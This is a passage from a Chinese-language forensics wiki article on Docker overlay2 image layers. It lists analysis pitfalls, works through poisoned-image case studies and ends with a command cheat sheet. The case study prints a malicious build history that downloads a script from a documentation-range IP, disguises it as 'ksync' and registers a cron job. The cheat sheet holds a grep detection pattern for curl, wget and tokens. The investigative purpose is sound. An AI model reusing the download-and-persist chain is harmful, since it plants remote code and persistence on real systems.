**现象**：数出 `history` 有 12 条、`RootFS.Layers` 只有 7 层，判定镜像配置被裁剪或层被部分清理。

**原因**：`history[].empty_layer` 为 `true` 的条目**不产生文件系统层**，因此不出现在 `RootFS.Layers` 里。`ENV`、`LABEL`、`CMD`、`WORKDIR`、`EXPOSE` 这类只改镜像配置、不动文件系统的指令都会留一条空层记录。

**`history` 长度大于层数是正常状态。**

**影响**：这条误判在正常镜像上就会反复触发，足以让整套规则失去意义。

更麻烦的是它会掩盖真正的问题——「真实层数与非空层数不一致」这个正确判据被淹没在噪音里。

**核查**：**只数 `empty_layer` 为假的条目**，再与 `RootFS.Layers` 的长度比对。

两者相等说明配置自洽。不等才是信号，此时要区分两种可能：配置 JSON 被改过，或磁盘上的层被部分 `prune`。

<a id="section-25"></a>

#### 陷阱 8：按 `docker inspect` 的大写字段名读 imagedb JSON

**现象**：脚本里写 `d["Config"]["Env"]` 和 `d["RootFS"]["Layers"]`，跑出来全是 `None`，判为「该镜像没有环境变量、没有层」。

**原因**：imagedb 里存的配置 JSON 用的是小写键——顶层是 `config` 与 `rootfs`，层数组在 `rootfs.diff_ids`；大写的 `Config`/`RootFS` 是 `docker inspect` **输出**的写法，不是磁盘上的存储格式。

两套字段名指向同一批数据，键名不同。

**影响**：静默失败。

所有 `Env`、`Labels`、`Cmd` 判为「没有」，于是「镜像里没写矿池地址」这种本该由配置直接给出的结论被当成阴性发现。**脚本不报错，错误一路流进报告。**

**核查**：读取时用「先取存在的一个」的兼容写法（3.3 脚本的 `pick(d, "config", "Config")` 即为此设计）。

并且**把「字段缺失」与「字段为空」区分开**——前者说明脚本读错了键，后者才是镜像本身没配。调试时先 `json.load` 后打印顶层键名确认实际结构。

<a id="section-26"></a>

### 4.3 配置字段判读与导出

<a id="section-27"></a>

#### 陷阱 9：把 `Config.Volumes` 当成实际挂载

**现象**：镜像配置里有 `{"Volumes": {"/app/logs": {}}`，据此断定该镜像运行时把宿主 `/app/logs` 挂了进去，并在宿主上找不到对应痕迹而认为「载荷未落盘」。

**原因**：`Config.Volumes` 只是镜像**声明**的卷——作用是在容器启动时，若该路径未挂载则自动创建一个匿名卷。它**不含宿主路径、不含是否真的挂载**。真实挂载关系在容器侧的 `Mounts`（类型、`Source` 宿主路径、`Destination`、`RW`）里。

**影响**：载荷往往正是写进卷才得以长期留存。

把声明当成实际挂载，会导致去查一个根本不存在的宿主路径，得出「未落盘」的错误结论，而真正的 `Source` 目录从未被查过。

**核查**：镜像声明与运行时挂载**必须对照**，差集本身就是发现——**声明之外多挂的目录**，尤其是指向 `/`、`/var`、`/etc` 或 Docker socket 的，是需要重点记录的配置。

对应处理见[第 03 篇](server-docker-docker-volumes-and-bind-mounts.md)。

<a id="section-28"></a>

#### 陷阱 10：忽略 `Config.Healthcheck`

**现象**：逐镜像检查完 `Cmd`、`Env`、`Labels` 都没异常，判定镜像未做隐蔽外连。

**原因**：`Config.Healthcheck` 定义容器健康检查的探测命令与间隔。**探测命令本身由镜像定义，会按周期自动执行**——指向外部地址的 `curl`/`wget` 就是一个周期性外连通道。

且它不出现在 `Cmd` 里，很容易在只查启动命令时被跳过。

**影响**：漏掉它意味着漏掉一条**持续运行的**外连证据。

这类通道的价值在于它按周期触发，即便容器业务看起来完全正常。

**核查**：对每个镜像单独打印 `Healthcheck`，检查 `Test` 里的命令与 URL、`Interval` 的频率、`Timeout`。

判定要点是「探测目标是否在业务合理的依赖列表里」——出现与业务无关的外部地址即需记录。3.3 脚本已把该字段单列一行，不要在摘要输出里把它删掉。

<a id="section-29"></a>

#### 陷阱 11：把 `docker export` 当镜像归档

**现象**：只做了 `docker export -o out.tar <容器>`，后续离线分析时试图从中恢复启动命令与环境变量，全部失败。

**原因**：`export` 导出的是**容器某次运行的合并视图**，拍平成单层扁平 tar，不含 `Config`、`Labels`、`Env`、`history`。

镜像是「可复现的配方」，容器是「一次的文件现场」，两者根本不是同一类东西。

**影响**：最关键的一类证据（攻击者起容器时的原始命令、注入的环境变量、拉取来源私库地址）**全部丢失且不可事后补回**——除非 `config.v2.json` 还在。

这直接决定「恶意镜像能否被完全定性」。

**核查**：归档用 `docker save`（保配置与层边界），`export` 只用来取文件现场；取证时两个都做，且先做 `save`。另外两者**都不含卷数据**，卷要单独取，见[第 03 篇](server-docker-docker-volumes-and-bind-mounts.md)。

<a id="section-30"></a>

#### 陷阱 12：★ 在目标机上 `docker pull` 拉镜像「取证」

**现象**：为了比对镜像，在目标机上直接 `pull` 一个可疑 tag 到本机分析。

**原因**：`pull` 会向镜像仓库发起请求，把本次调查暴露给仓库运营方（对方会看到异常拉取来源，从而可能清理镜像或日志）；若配置了 `insecure-registries` 或共用账号，这次拉取在仓库侧留下的记录与真实业务流量混在一起。此外它会修改本机镜像库状态，属于对现场的操作。

**影响**：一是**污染对方的证据**（镜像被删、审计日志被清理）；二是**污染自己的证据**（本地镜像库多出无法解释的条目）；三是在授权范围不明时，取证人员的行为本身可能构成对第三方的未授权访问。

**核查**：只在离线分析机上用 `docker load` 加载已固定的 tar，或直接对磁盘上的 imagedb JSON 做静态解析。

镜像配置是纯文本 JSON，**完全不需要真的把镜像跑起来或拉下来**。需要仓库侧信息时，通过委托方正式调取仓库审计日志。
<a id="section-31"></a>

#### 陷阱 13：把「层被 prune」写成「该层不存在」

**现象**：脚本输出若干 `→ 未在 overlay2 中找到（可能已 prune）`，报告写成「该镜像不存在对应层」。

**原因**：层目录不存在有多种成因：`docker image rm`、`docker system prune`、`docker image prune -a`、磁盘空间不足时的自动清理、以及正常的 `docker save`/迁移后清理。

「磁盘上现在没有」与「这一层从未被构建出来」是完全不同的两件事。

**影响**：写成「不存在」等于断言镜像构建过程有问题，会把调查引向镜像来源这条错误的线。

而实际最可能的情况只是常规运维清理。

**核查**：结论分层写。

先写**工件状态**：「imagedb 记录的 N 层中，有 M 层在 `overlay2/` 下无对应目录」；再写**证据边界**：「缺失原因不可考，可能为 `image prune`/`system prune` 或镜像迁移；缺失层内是否曾含可疑文件不可判定」。

这一段必须同时出现在「证据缺失」清单里，不能只写正面结论。

<a id="section-32"></a>

#### 陷阱 14：把 `created` 晚于依赖发布时间直接当成投毒

**现象**：看到一个 `created` 时间明显晚于其基础镜像发布时间的镜像，写下「该镜像为投毒镜像」。

**原因**：`created` 是**本次构建**的时间。重打标签（retag）、重新推送同一份内容、CI 每次构建都生成新配置哈希——都会让 `created` 变新，而内容可能完全没变。

它是**时间信号，不是内容信号**。

**影响**：把「构建时间新」当成「内容被改」，会给出无法辩护的定性。

更现实的风险是反向漏判：`created` 被人为回拨到旧时间时（配合重打标签），单看时间就完全看不出异常。

**核查**：内容判定的依据是 `history[].created_by` 与层内容——下载执行链、安装可执行文件、建立账号与计划任务的具体指令，以及层目录里实际存在的文件。

`created` 只用来做时间线的位置标注。

若要认定「基础层未被改动」，必须用 diff_id 与上一次构建的配置比对。这是内容级判断，不是时间级判断。

<a id="section-33"></a>

### 4.4 层时间与文件时间

<a id="section-34"></a>

#### 陷阱 15：把层内文件的 mtime 当成该层的构建时刻

**现象**：某层 `diff/` 下文件的 mtime 显示为 2024-03-18，据此报告「该层于 2024-03-18 被构建」，并把该层归为可疑时间窗内新增。

**原因**：层目录里文件的 mtime 来自**构建过程中的具体操作**——`COPY`/`ADD` 会保留源文件自带的 mtime，`RUN` 产生的文件取构建当时的时刻，还原出来的压缩包与镜像会保留归档内的原始时间。

**两种 mtime 都不等于层本身的创建时间。**

层与镜像的权威创建时间只有两处：imagedb JSON 里的 `created` 字段，以及 `history[]` 中各条目的 `created`，两者都是 **RFC 3339 UTC（带 `Z`）**。

而 ext4 的 mtime 是**无时区标记的**目标机本地时间，国内服务器通常是 UTC+8——直接相减会稳定差出 8 小时。

**影响**：这与陷阱 14 是同一枚硬币的两面：只看 `created` 会漏掉「构建时拷进来、运行期未改」的文件，只看 mtime 会把「运行期或构建期某一步操作」误当成层的时间。

两者混用的直接后果是分不清投毒发生在构建期还是运行期，而这两者的整改动作完全不同——前者要重建流水线与镜像基线，后者只需清理容器与可写层。

8 小时的偏差还足以让「先构建后运行」的因果顺序颠倒。

**核查**：构建时刻只认 imagedb 的 `created`，文件 mtime 只用来说明「该文件在层内的时间状态」，不用于判定层的年龄。

做比较前把 mtime 按目标机时区换算到 UTC 再与 `created` 对齐，并在时间线表格里并列「原始值 + 时区」与「UTC 换算值」两列。

若两者差值超出构建过程的合理跨度，那本身是值得追查的信号，但要按陷阱 14 的要求配旁证，不能单凭差值定性。


<a id="section-35"></a>

## 五、案例示例

<a id="section-36"></a>

### 5.1 镜像投毒的三层 created_by 自述与哈希自洽验证

**场景**

委托方报告其私有镜像仓库 `registry.local` 中名为 `web` 的业务镜像疑似被投毒。

委托方已导出镜像归档 `DigiForensics-app.tar`（`docker save` 格式），并提供一台测试节点主机的镜像 `DigiForensics.dd`（raw，200 GB，ext4 起始扇区 1181696，overlay2 驱动）。已知该镜像在 2024-03-18 09:00 前后被重新推送过。

这条路径值得先走，是因为 `history[].created_by` 逐字记录了构建时执行的每一条命令——投毒命令本身就是证据，不需要反编译，也不需要去猜载荷行为。而且这条自述有哈希保护（配置 JSON 的文件名就是它自己的哈希），不容易被事后掩盖。

**处置过程**

第 1 步 · 从归档直接确认"配方"（这一步不需要碰镜像）

```bash
tar -tvf /evidence/DigiForensics-app.tar
# manifest.json  + 7 个 <layer>/{VERSION,json} 条目
tar -xOf /evidence/DigiForensics-app.tar manifest.json | python3 -m json.tool | head -30
```

`manifest.json` 里同时出现 `rootfs.diff_ids`（**diff_id 数组**）与 `layers[].digest`（**chain_id 形式**）——**这就是 2.4 那张表的实证**，两数组长度必须相等，可当场验证。

第 2 步 · 读 imagedb JSON 找投毒层

```bash
python3 img_summary.py /mnt/df/var/lib/docker > /evidence/img-summary.txt
sed -n '/配置哈希  9a12c4e5/,/^$/p' /evidence/img-summary.txt
```

```
配置哈希  9a12c4e5f7b0d3a1 | created 2024-03-18T08:58:41Z
  00 [产生文件系统层] /bin/sh -c #(nop) ADD file:9d8e7f6a in /
  01 [产生文件系统层] /bin/sh -c apt-get update && apt-get install -y nginx curl
  02 [产生文件系统层] /bin/sh -c mkdir -p /opt/app && curl -sL http://198.51.100.24/p.sh -o /opt/app/p.sh && chmod +x /opt/app/p.sh   ★
  03 [产生文件系统层] /bin/sh -c cp /opt/app/p.sh /usr/local/bin/ksync && cp /opt/app/p.sh /etc/cron.d/ksync   ★
  04 [产生文件系统层] /bin/sh -c echo "0 */5 * * * root /usr/local/bin/ksync" > /etc/cron.d/ksync
  05 [empty_layer]   /bin/sh -c #(nop)  CMD ["nginx","-g","daemon off;"]
```

**发现 1**：第 02–04 层构成完整的**下载执行 + 持久化链**。

`curl` 从外网拉脚本 → `chmod +x` → 复制到 `/usr/local/bin/`（伪装成同步工具 `ksync`）→ 再复制一份到 `/etc/cron.d/` → 写 crontab 每 5 分钟执行。

**为什么这几层是关键**：`created` 整体是 2024-03-18 08:58，但第 00、01 层内容与 2024-02-20 首次构建时相同。

`created_by` 是镜像自述，改它等于改整个配置 JSON，而配置 JSON 的文件名是它自己的哈希（第 3 步验证）。

第 3 步 · 验证配置 JSON 自洽（排除事后拼接伪造）

```bash
f=/mnt/df/var/lib/docker/image/overlay2/imagedb/content/sha256/9a12c4e5...
sha256sum "$f" | awk '{print $1}'
# b1c2d3e4f5a6...9f  与文件名相同 → 该 JSON 自洽，history 未被后期改写
```

第 4 步 · 映射到磁盘层目录，定位实际文件（物证）

脚本输出把 `RootFS.Layers` 逐条映射到 `overlay2/<cache-id>`：`[02] → overlay2/Qw8Er5uI`、`[03] → overlay2/Zt1Yu7oP`。于是：

```bash
# 第 [02] 层：下载的原始脚本
find /mnt/df/var/lib/docker/image/overlay2/Qw8Er5uI/diff/opt -type f \
     -printf '%TY-%Tm-%Td %TH:%TM %m %s %p\
' 2>/dev/null
# 2024-03-18 08:58:12 755 4183 /opt/app/p.sh
cp --preserve=all /mnt/df/var/lib/docker/image/overlay2/Qw8Er5uI/diff/opt/app/p.sh /evidence/p-layer2.sh

# 第 [03] 层：伪装的"同步工具"与 cron 条目
cat /mnt/df/var/lib/docker/image/overlay2/Zt1Yu7oP/diff/etc/cron.d/ksync
# 0 */5 * * * root /usr/local/bin/ksync
sha256sum /mnt/df/var/lib/docker/image/overlay2/Qw8Er5uI/diff/opt/app/p.sh \
          /mnt/df/var/lib/docker/image/overlay2/Zt1Yu7oP/diff/usr/local/bin/ksync
# 两者哈希相同 → 同一载荷的两份副本
```

**发现 2**：`/opt/app/p.sh` 与 `/usr/local/bin/ksync`（及 `/etc/cron.d/ksync`）**内容哈希一致**，是同一载荷的多个副本。

这与 `history` 第 02–04 层的 `created_by` 完全对应——**配置自述 + 文件物证双源印证**。

**结论**

| 结论 | 支撑证据 | 强度 |
|---|---|---|
| 镜像 `web` 于 2024-03-18 08:58 被重新构建并投毒 | `created` + 三层 `created_by` 的 `curl` | 强 |
| 载荷从 `198.51.100.24` 下载 | `created_by` 中的完整 URL | 强 |
| 载荷以 `ksync` 伪装成同步工具并注册 crontab 每 5 分钟执行 | 层内实文件 + `created_by` | **强（物证）** |
| 多个副本内容一致 | 文件 sha256 相同 | 强 |
| 配置 JSON 未被事后拼接伪造 | 文件名 = 内容 sha256 | 强（排除了元数据被改的可能） |
| 基础层（第 00、01 层）未被改动 | diff_id 与首次构建时相同 | 中（基于 diff_id 比对，是否被使用需结合仓库侧审计） |
| **投毒镜像是否已被实际部署运行** | 需仓库拉取日志 + 节点容器记录 | 未决项，须查 `journalctl -u docker` |
| **攻击者如何获得推送权限** | 需仓库侧审计与 CI 凭证排查 | **未决项，须列为待查** |

**本节能证明**：投毒命令的原文、投毒时间、载荷的多副本落位。

**本节不能证明**：投毒镜像是否被拉取运行过（这需要 `journalctl -u docker` 的拉取记录）、`198.51.100.24` 是否属于攻击者本人。

**误判对照**

最容易出的错有两个方向，第二个更隐蔽。

第一个是把 **`created` 时间当成"投毒发生时间"**。

`created` 是**配置 JSON 的生成时刻**，一次 `docker commit` 或重新构建会整体刷新它。

一个纯 `docker tag` 重标记**不会**产生新配置（tag 指向同一个 config hash），而 `docker push` 更不会改本地配置。

所以 `created` 只能作为"该配置被写入磁盘的时间上界"，不能单独用来定性"谁在什么时候投的毒"。

1. **判据**：`created` 只能与 `RootFS.Layers` 中新增层的 `created_by` 内容联合使用。判断"这一层是新加的"要看它的 `diff_id` 是否不在旧版本的 `rootfs.diff_ids` 数组里，而不是看时间戳。
2. **判据**：`created_by` 是**镜像自述字段**。它可以被 `docker commit -m "..."` 伪造。**唯一能证明它没被伪造的，是第 3 步的哈希自洽**——文件名 = 内容 sha256 成立，只能说明"这个 JSON 从写完到现在没被改过"，**不能说明"写它的人就是攻击者"**。
3. **判据**：`198.51.100.24` 是 `curl` 的目标地址，它可能是攻击者自建的服务器、**也可能是被入侵的第三方服务器或跳板**。要归因到具体主体，必须有仓库侧推送审计（源 IP、CI token 使用记录）。仅凭镜像内的 URL 写"攻击者 IP 为 X"是越界的。

按错误判据走，第 3 条踩中的后果最重。

报告里写死的攻击者 IP 一旦是错的主体，委托方可能据此发起法律程序或对外声明。

而推翻它需要推翻整个投毒时间线。

若委托方用"攻击者 IP"作为唯一抓手去追责，交付方要承担结论误导的责任。

<a id="section-37"></a>

### 5.2 同名不同 ID 重标记与真重建的区分

**场景**

委托方在本节 5.1 的基础上追问："`docker image ls` 里 `web` 出现了两个 sha256 ID，我们 CI 里跑的就是 `web:latest`。到底哪个是跑在生产上的？哪个是我们自己构建的？"

这个问题在取证现场很常见。**tag 是可变的，ID 是不可变的**，而 CI 配置里写的永远是 tag。

委托方看到的 `web:latest` 指向哪个 ID，决定了他们"以为在跑的东西"和"实际在跑的东西"是不是同一个。

**处置过程**

先明确两者的对应关系，再回答"哪个在跑"：

```bash
# 1) 列出所有 tag → ID 映射，注意同一个 ID 可能有多个 tag
docker image ls --no-trunc --digests --format '{{.Repository}}:{{.Tag}} {{.ID}} {{.CreatedAt}} {{.Digest}}'
# registry.local/digiforensics/web:latest   sha256:9a12c4e5f7b0...  2024-03-18 08:58:41
# registry.local/digiforensics/web:2024-02  sha256:3c7faa11b2c9...  2024-02-20 11:04:03
# <none>:<none>                             sha256:3c7faa11b2c9...  2024-02-20 11:04:03   ★ 悬空

# 2) 关键：读 repositories.json 里的 tag 指针
jq -r '.["registry.local/digiforensics/web"]' \
   /mnt/df/var/lib/docker/image/overlay2/repositories.json
# {"latest":"9a12c4e5f7b0d3a1","2024-02":"3c7faa11b2c9..."}
```

`latest` 已经指向了投毒的那个 ID。

旧 ID `3c7faa11` 的 tag 在这个仓库里已被覆盖，但因为没有任何 tag 指向它，它在 `docker image ls` 里显示为 `<none>:<none>`。

**这就是悬空镜像（dangling）。**

再确认"生产上跑的到底是哪个"——**看容器，不看 tag**：

```bash
# 3) 容器记录下来的 Image 字段是 ID（不可变），不是 tag
docker ps -a --no-trunc --format '{{.Names}} {{.Image}} {{.ID}}'
# digiforensics-app   registry.local/digiforensics/web:latest   4f1c9a2b7e30
# digiforensics-cache registry.local/digiforensics/web:2024-02 8b3d1e0c5f72

docker inspect 4f1c9a2b7e30 --format '{{.Image}}'
# sha256:9a12c4e5f7b0d3a1...    ← 就是投毒那个配置
```

**结论**

- **生产正在运行的是投毒配置**。判据是 `.Image` 字段（`docker inspect` 返回的是 ID，不是 tag），而不是 CI 配置里写的 `web:latest`。
- 旧 ID `3c7faa11` 处于悬空状态。它不会被 `docker image prune` 立即删除（需要 `-a` 参数），这一点在报告的"清理范围"里要写明，否则会残留一份未被使用的旧层。

- 重标记的**时间**无法从 `repositories.json` 得出。该文件**不记录 tag 何时被改指向**。本案的时间只能由 `created`（配置写入时刻）与仓库侧 push 审计给出。

**误判对照**

这个案例里最容易出的错是把 `docker image ls` 的两行输出直接当成"存在两个恶意镜像"。

常见的错误判据是"同名不同 ID = 有人重新构建了一个恶意版本"。
1. **判据**：**两个 ID 不等于两个投毒版本**。正常 CI 每次构建都会产生新 ID，同仓库的 `web` 在半年内积累两三个 ID 完全正常。判断是否投毒要看 `created_by`（见 5.1），而不是看 ID 数量。
2. **判据**：**反过来也不能因为"只有一个 ID"就排除投毒**。攻击者可以在原始配置 JSON 上直接追加层，用**同一个 tag** 覆盖旧 ID 后再 `docker push --force`。这时节点上只会看到一个 ID，但该 ID 的 `RootFS.Layers` 比上游基础镜像多出层。唯一可靠的判据是层数与 diff_id 集合的异常，不是有几个 ID。
3. **判据**：`<none>:<none>` **不等于"被删除的恶意镜像"**。`docker rmi <tag>` 移除 tag 而保留镜像，就会产生悬空镜像——这是一个**正常的镜像清理中间态**。要证明某个 ID 是"旧的干净版本"，得比对它的 `rootfs.diff_ids` 与已知良好基线。

第 2 条错误判据会使同 tag 覆盖的情形被漏判。

如果按"只有一个 ID，所以没被投毒"结案，而攻击者恰恰走的是同 tag 覆盖路径，委托方会认为已经完成处置而**不做任何复查**。

这个结论会以"已闭环"的形式进入整改报告，比误报入侵更难撤回。
<a id="section-38"></a>

### 5.3 反例 docker save 归档与本机缓存不一致时以谁为准

**场景**

委托方在本节 5.1 的基础上之后追加提供了一份从仓库服务器直接 `docker pull` 后 `docker save` 得到的归档 `DigiForensics-app-r2.tar`，并说："这是我们从仓库拉的最新版，应该比你们从节点硬盘上看到的更新。"

于是出现两份互相冲突的"投毒证据"：节点 imagedb 里的 `9a12c4e5`（2024-03-18 08:58），和这份新归档。

两者的层内容不同。

这是一份典型的**双源冲突**，处理方式决定了报告能不能站住。

**处置过程**

先固定两份证据的哈希，再做结构比对，最后才判断谁代表"线上真实状态"：

```bash
# 1) 固定两份归档的哈希（此后所有结论都锚在这两个哈希上）
sha256sum /evidence/DigiForensics-app.tar /evidence/DigiForensics-app-r2.tar | tee /evidence/tar-hashes.txt

# 2) 比对 manifest.json：层数、diff_id 序列
for t in DigiForensics-app DigiForensics-app-r2; do
  echo "== $t"
  tar -xOf /evidence/$t.tar manifest.json \
    | jq -r '.[] | "config=\(.config) layers=\(.layers|length)", (.rootfs.diff_ids[]|split(":")[1][0:12])'
done
```

```
== DigiForensics-app          （节点缓存）
config=9a12c4e5f7b0...  layers=7
3c7faa11b2c9  7d1e0a3f...  b91c...  a45f...  ★ 第 4 层起与 r2 不同
== DigiForensics-app-r2       （仓库 pull）
config=e5b7d2c9a104...  layers=5
3c7faa11b2c9  7d1e0a3f...  a45f...              ★ 少了两层
```

**差异只有一个方向**：r2 **比节点缓存少两层**，而前 3 个 `diff_id` 完全相同。少掉的两层正是节点版里的第 02–04 层（`curl` 下载 + `cp ksync` + crontab）。

```bash
# 3) 确认 r2 的 config 是不是更新的（比较 config JSON 的 created）
tar -xOf /evidence/DigiForensics-app-r2.tar \
    $(tar -tf /evidence/DigiForensics-app-r2.tar | grep -m1 '^[0-9a-f]\{64\}\.json$') \
    | jq -r '.created, .created_by'
# 2024-03-19T02:14:55Z
# 2024-03-19T02:14:55Z /bin/sh -c #(nop)  CMD ["nginx","-g","daemon off;"]
```

r2 的 `created` 确实**更晚**（03-19 02:14 > 03-18 08:58），层数更少，投毒层不见了。

**结论**

- 节点缓存 `9a12c4e5` 曾被实际部署并运行——证据是 `docker inspect` 的 `.Image` 字段与该 ID 一致（见 5.2）。仓库端已修复**不影响这个事实**。

- **r2 是修复后的干净版本**，`created` 更晚且不含投毒层。把它当作"最新状态"写进报告是可以的，但必须同时写明节点曾在 03-18 08:58 到 03-19 02:14 之间运行投毒配置。

- **限定范围**：本次比对覆盖两份归档的 `manifest.json` 与 config JSON。**未做**逐层 diff（`layer/chainid` 目录的完整文件级比对），因此"其余层完全一致"是**基于 diff_id 集合相等**的推断，不是文件级结论。

**误判对照**

这个反例最容易出的错是"仓库里的最新版是干净的，所以节点上的问题已经不存在了"——把"上游已修复"等同于"受影响节点已修复"。

1. **判据**：判断"某节点是否受影响"的唯一判据是**该节点上实际运行过的容器 `.Image` 字段**，不是仓库当前状态。仓库修复后，节点上的旧容器、旧镜像层、已落盘的 volume 都还在。
2. **判据**：`created` 更晚**不能**作为"这个版本更可信/更干净"的判据。攻击者同样可以在投毒后重新构建一个 `created` 更晚的版本——**时间新旧只说明构建顺序，不说明内容性质**。判断干净与否要看层内容与 `created_by`。
3. **判据**：两份归档冲突时，**不要用"哪份更权威"来选边**。正确做法是把两份都固定为证据，判定冲突的性质（本例是"上游修复"而非"节点被篡改"），再各自赋值。选边下结论等于把一份证据排除在报告之外。

按错误判据走，本案若按第 1 条结案，委托方会认为无需再检查任何节点。

而投毒载荷曾注册 crontab、曾以 `ksync` 落在 `/usr/local/bin/`。

**这些文件在"仓库修好"之后依然留在节点磁盘上**，且指向当时那个 `198.51.100.24`。

清理动作被跳过，等于把一个已知落点原样保留。

<a id="section-39"></a>

## 六、扩展阅读方向

本篇把 overlay2 的层结构讲透了。往下走会遇到四类问题——层里看到的东西怎么定性、删除语义怎么理解、存储后端不一样怎么办、这份配方是从哪来的。

**同层深入：层结构里的细节与边界**

- [Docker 取证工件地图](server-docker-docker-artifact-map.md) —— **层内容解析的前置条件**。存储驱动的确认、采集时机（容器 `rm` 后写层就没了）、以及路径全景都在这一篇。
- [Volume 与绑定挂载取证](server-docker-docker-volumes-and-bind-mounts.md) —— **层里的文件不是全部**。写入卷与绑定挂载的内容不在 `diff/` 里，而在宿主机目录上。**只查层的分析是不完整的。**
- [ext4 结构与 inode](../../filesystem/filesystem-unix/filesystem-unix-ext4-inode.md) —— 层目录本质是宿主 ext4 上的普通目录。层内文件的删除时间、恢复写入、无 inode 残留挖取，全靠这套结构知识。
- [文件雕刻与签名恢复](../../filesystem/filesystem-unix/filesystem-unix-file-carving-and-signature-recovery.md) —— 层内容被改写或文件头损坏时的兜底路径。

**判据与反例：这些"看起来可疑"的东西**

- [容器逃逸与运行时痕迹](../server-k8s/server-k8s-container-escape-and-runtime-artifacts.md) —— 镜像里的 `CMD`/`Env` 指向宿主机路径、`--privileged`、`/var/run/docker.sock` 挂载等配置项的识别。**本篇只给出"怎么读"，判定标准在那。**
- [反取证手法与时间戳篡改检测](../../fundamentals/fundamentals-concepts/fundamentals-concepts-anti-forensics-and-timestamp-tampering.md) —— **层时间可被改写**。`docker history` 的时间戳与层内文件 mtime 的一致性本身就是一条判据，两者不一致时该怎么解释，这篇给判据。
- [哈希与完整性校验](../../fundamentals/fundamentals-concepts/fundamentals-concepts-hashes-and-integrity-verification.md) —— `diff_id`、配置哈希、镜像摘要三者的关系，以及"摘要一致"到底证明了什么。
- [近似匹配与模糊哈希](../../fundamentals/fundamentals-concepts/fundamentals-concepts-fuzzy-hashing.md) —— 一批镜像聚类时，"同一个 base 但改了业务代码"的镜像需要模糊匹配才能聚到一起。

**供应链：这份配方是谁做的**

- [容器逃逸与运行时痕迹](../server-k8s/server-k8s-container-escape-and-runtime-artifacts.md) —— `repositories.json` 里的陌生 registry、私库证书痕迹、Docker API 暴露的排查。
- [K8s 取证工件地图](../server-k8s/server-k8s-kubernetes-artifact-map.md) —— 集群侧的镜像拉取记录与 CRI 日志，**是私库侧审计的对应物。**
- [WebShell 工具流量特征](../server-web/server-web-webshell-traffic-patterns.md) —— 容器里的 webshell 与宿主机上的在流量特征上无差别，但取证路径完全不同。

**存储后端：驱动不是 overlay2 时怎么办**

- [镜像制作](../../imaging/imaging-acquire/imaging-acquire-disk-imaging-and-evidence-preservation.md) —— 需要从在线主机导出时，**制作镜像的方式决定了你拿到的是完整副本还是加工品**。
- [证据格式与转换](../../imaging/imaging-acquire/imaging-acquire-evidence-image-formats.md) —— 导出的镜像与原始层目录在效力上的差别。
- [只读挂载与安全接入](../../imaging/imaging-mount-simulate/imaging-mount-simulate-read-only-mounting.md) —— 挂载 `overlay2/<id>/merged/` 或层目录时的纪律。注意 `merged/` 在容器停止后是空壳，这个前提要确认再挂。
<a id="section-40"></a>

## 七、命令速查

```bash
# ===== 1. 确认驱动与层规模 =====
docker info | grep -iE 'Storage Driver|Backing Filesystem'
ls -1 /mnt/df/var/lib/docker/                    # overlay2? aufs? devicemapper?（按实际存在者）
ls -1 /mnt/df/var/lib/docker/overlay2/ | wc -l
ls -l /mnt/df/var/lib/docker/overlay2/l/ | head  # cache-id ←→ 短 ID 映射

# ===== 2. 读层链与层内元数据 =====
CID=$(ls -1 /mnt/df/var/lib/docker/overlay2/ | grep -v '^l$' | head -1)
cat  "/mnt/df/var/lib/docker/overlay2/$CID/link"        # lowerdir 链（从低到高）
ls -l "/mnt/df/var/lib/docker/overlay2/$CID/v2/"
cat  "/mnt/df/var/lib/docker/overlay2/$CID/v2/repositories"  # chain_id 与历史 layer id 并存处
cat  "/mnt/df/var/lib/docker/overlay2/$CID/v2/json"

# ===== 3. 汇总镜像元数据与层映射（脚本见正文 3.3）=====
python3 img_summary.py /mnt/df/var/lib/docker > /evidence/img-summary.txt
grep -nE 'curl|wget|base64|chmod \+x|198\.51\.100|PASSWORD|TOKEN' /evidence/img-summary.txt

# ===== 4. 离线还原 docker history =====
python3 -c "
import json,glob
for f in glob.glob('/mnt/df/var/lib/docker/image/overlay2/imagedb/content/sha256/*'):
    d=json.load(open(f))
    print('配置哈希', f.split('/')[-1][:16], '| created', d.get('created'))
    for i,h in enumerate(d.get('history',[])):
        print(f\"  {i} {'[空层]' if h.get('empty_layer') else '[层]'} {h.get('created_by','')[:110]}\")
    for l in (d.get('RootFS') or {}).get('Layers',[]): print('   diff_id', l)
"

# ===== 5. 验证配置 JSON 自洽（文件名 = 内容哈希）=====
f=$(ls /mnt/df/var/lib/docker/image/overlay2/imagedb/content/sha256/* | head -1)
sha256sum "$f" | awk '{print $1}'; basename "$f"

# ===== 6. 直接遍历层内容（找被植入的文件）=====
find /mnt/df/var/lib/docker/overlay2/*/diff \( -name 'xmrig' -o -path '*/tmp/*' -name '*.sh' \) 2>/dev/null
find /mnt/df/var/lib/docker/overlay2/<cache-id>/diff -type f \
     -printf '%TY-%Tm-%Td %TH:%TM %m %s %p\
' 2>/dev/null | sort | head -60
find /mnt/df/var/lib/docker/overlay2/*/diff -type f -perm /111 \
     -printf '%TY-%Tm-%Td %TH:%TM %m %s %p\
' 2>/dev/null | sort | tail -40

# ===== 7. 导出（save 保元数据，export 只保文件；两者都不含卷）=====
docker save   -o /evidence/DigiForensics-app.tar registry.local/digiforensics/web:latest
docker export -o /evidence/container-view.tar   digiforensics-app
tar -tvf /evidence/DigiForensics-app.tar | head      # 应见 manifest.json + 多层
tar -xOf /evidence/DigiForensics-app.tar manifest.json | python3 -m json.tool   # diff_ids 与 chain_id 对照
```

> **本篇延伸**：容器内改动的实际落地点（`diff/`）属哪个容器、能否对应到具体容器，见[第 01 篇](server-docker-docker-artifact-map.md)；`Config.Volumes` 与实际挂载的差异见[第 03 篇](server-docker-docker-volumes-and-bind-mounts.md)。

---

📌 **版权与引用声明**

本文为 DigiForensics 独立创作的知识条目，采用 [知识共享 署名-相同方式共享 4.0 国际](https://creativecommons.org/licenses/by-sa/4.0/deed.zh-hans) 许可协议发布。

- **署名**：引用本文时请注明「DigiForensics Wiki — 服务器与 Web 取证 — 镜像层与 overlay2 解析」
- **相同方式共享**：衍生作品须采用相同协议发布

示例：`本文内容参考自 DigiForensics Wiki《镜像层与 overlay2 解析》（CC BY-SA 4.0）`

文中 `DigiForensics.dd`、`DigiForensics-app.tar` 等均为示例证据文件名，指向虚构或已脱敏的检材，与真实案件无关。
